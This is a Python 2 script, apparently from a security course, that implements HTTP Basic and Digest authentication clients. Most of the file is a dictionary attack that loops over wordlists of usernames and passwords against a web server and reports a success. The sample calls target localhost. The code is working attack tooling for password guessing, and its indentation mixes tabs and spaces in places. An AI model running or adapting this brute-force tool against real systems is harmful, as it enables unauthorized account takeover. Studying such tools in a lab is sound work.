#!/usr/bin/python
# -*- coding: utf-8 -*-
from urlparse import urlparse
import requests, ssl, httplib, base64, urllib, hashlib, time, os
##################################################################
####
##################################################################
# @param string url
# @param string port
# @param string usr
# @param string pwd
# @param bool tls - True, https. False http
def authBasic(url, port, usr, pwd, tls):
    print "-------------------------------"
    print "---  Basic   Authentication ---"
    print "---  url: "+ url
    print "---  port: "+ str(port)
    print "---  user: "+ str(usr)
    print "---  password: "+ str(pwd)
    print "-------------------------------"
    
    auth_str = usr+':'+pwd
    auth_str_b64 = base64.b64encode(auth_str)
    headers = {"Authorization": "Basic "+auth_str_b64}
    params = urllib.urlencode({})
    p_parsed = urlparse(url)
    host = p_parsed.netloc
    resource = p_parsed.path
    if tls :
        context = ssl.create_default_context()
        conn = httplib.HTTPSConnection(host,port);
       
    else:
        conn = httplib.HTTPConnection(host,port)
    conn.request("GET", resource, params, headers)
    response = conn.getresponse()
    print response.status, response.reason
    if response.status == 200:
        return True
    return False
    
# @param string url
# @param string port
# @param string usr
# @param string pwd
# @param bool tls - True, https. False http
def authDigest(url, port, usr, pwd, tls,method='GET'):
    print "-------------------------------"
    print "---  Digest Authentication  ---"
    print "---  url: "+ url
    print "---  port: "+ str(port)
    print "---  user: "+ str(usr)
    print "---  password: "+ str(pwd)
    print "-------------------------------"
    
    p_parsed = urlparse(url)
    params = urllib.urlencode({})
    host = p_parsed.netloc
    resource = p_parsed.path
    if tls :
        context = ssl.create_default_context()
        conn = httplib.HTTPSConnection(host,port)
        
    else:
        conn = httplib.HTTPConnection(host,port)
    conn.request(method, resource)
    # primera petición
    response = conn.getresponse()
    # obtenemos los parámetros
    (realm, nonce, algorithm, qop, opaque) = parseResponse(str(response.msg))
    # Construimos los headers
    auth = build_digest_header(realm, nonce, qop, algorithm, opaque, usr, pwd,url,method)
    headers = {"Authorization": auth}
    if tls :
        context = ssl.create_default_context()
        conn = httplib.HTTPSConnection(host,port)
    else:
        conn = httplib.HTTPConnection(host,port)
    # segunda petición
    conn.request(method, resource, params, headers)
    response = conn.getresponse()
    print response.status, response.reason

    if response.status == 200:
        return True
    return False

# Función auxiliar para calcular la información
# requerida por el servidor para la autenticación digest
def parseResponse(response):
    realm, nonce, algorithm, qop, opaque = '','','','',''
    index_realm = response.find("realm")
    if index_realm > 0 :
        text= response[index_realm+7:]
        realm= text[0:text.find("\",")]

    index_nonce = response.find("nonce")    
    if index_nonce > 0:
        text= response[index_nonce+7:]
        nonce= text[0:text.find("\",")]

    index_algorithm = response.find("algorithm")    
    if index_algorithm > 0:
        text = response[index_algorithm+10:]
        algorithm = text[0:text.find(",")] 

    index_opaque = response.find("opaque")    
    if index_opaque > 0:
        text = response[index_opaque+8:]
        opaque = text[0:text.find("\",")] 

    index_qop = response.find("qop") 
    if index_qop > 0:
        text = response[index_qop+5:]
        qop = text[0:text.find("\"")]
    return realm, nonce, algorithm, qop, opaque
    
# Función auxiliar para obtener los headers para la petición de autenticación
def build_digest_header(realm, nonce, qop, algorithm, opaque, username, password, url,method):
        hash_utf8 = None

        if algorithm is None:
            _algorithm = 'MD5'
        else:
            _algorithm = algorithm.upper()
        # lambdas assume digest modules are imported at the top level
        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':
            def md5_utf8(x):
                if isinstance(x, str):
                    x = x.encode('utf-8')
                return hashlib.md5(x).hexdigest()
            hash_utf8 = md5_utf8
        elif _algorithm == 'SHA':
            def sha_utf8(x):
                if isinstance(x, str):
                    x = x.encode('utf-8')
                return hashlib.sha1(x).hexdigest()
            hash_utf8 = sha_utf8

        KD = lambda s, d: hash_utf8("%s:%s" % (s, d))

        if hash_utf8 is None:
            return None

        # XXX not implemented yet
        entdig = None
        p_parsed = urlparse(url)
        #: path is request-uri defined in RFC 2616 which should not be empty
        path = p_parsed.path or "/"
        if p_parsed.query:
            path += '?' + p_parsed.query

        A1 = '%s:%s:%s' % (username, realm, password)
        A2 = '%s:%s' % (method, path)

        HA1 = hash_utf8(A1)
        HA2 = hash_utf8(A2)

        _thread_local_nonce_count = 1
        ncvalue = '%08x' % _thread_local_nonce_count
        s = str(_thread_local_nonce_count).encode('utf-8')
        s += nonce.encode('utf-8')
        s += time.ctime().encode('utf-8')
        s += os.urandom(8)

        cnonce = (hashlib.sha1(s).hexdigest()[:16])
        if _algorithm == 'MD5-SESS':
            HA1 = hash_utf8('%s:%s:%s' % (HA1, nonce, cnonce))

        if not qop:
            respdig = KD(HA1, "%s:%s" % (nonce, HA2))
        elif qop == 'auth' or 'auth' in qop.split(','):
            noncebit = "%s:%s:%s:%s:%s" % (
                nonce, ncvalue, cnonce, 'auth', HA2
                )
            respdig = KD(HA1, noncebit)
        else:
            # XXX handle auth-int.
            return None

        _thread_local_last_nonce = nonce

        # XXX should the partial digests be encoded too?
        base = 'username="%s", realm="%s", nonce="%s", uri="%s", ' \
               'response="%s"' % (username, realm, nonce, path, respdig)
        if opaque:
            base += ', opaque="%s"' % opaque
        if algorithm:
            base += ', algorithm="%s"' % algorithm
        if entdig:
            base += ', digest="%s"' % entdig
        if qop:
            base += ', qop="auth", nc=%s, cnonce="%s"' % (ncvalue, cnonce)

        return 'Digest %s' % (base)
    

# @param auth = 1 -> Basic, 2 -> Digest
# @param protocolo = True -> https , False -> http
def passAttack(username,auth, protocolo, url, port,dic):
    f = open(dic, 'r')
    for line in f:
	password = line[:-1]
        res = False
        if auth == 1 :
            res = authBasic(url, port, username, password,protocolo)
        else :
            res = authDigest(url, port, username, password,protocolo)
            
        if res :
            print "Ya ganamos!"
            return True
    return False

# @param auth = 1 -> Basic, 2 -> Digest
# @param protocolo = True -> https , False -> http
def Attack(auth, protocolo, url, port,dicP, dicU):
    f = open(dicU, 'r')
    for line in f:
	user = line[:-1]
        if passAttack(user,auth, protocolo, url, port,dicP) :
            return
            
#Attack(1,False,"http://localhost/tienda/",80,"phpbb.txt.min","uhpbb.txt.min")            
#Attack(2,False,"http://127.0.0.1/perl/",80,"phpbb.txt.min","uhpbb.txt.min")            
    
#print authDigest("http://localhost/perl/",80,"admin","admin",False)

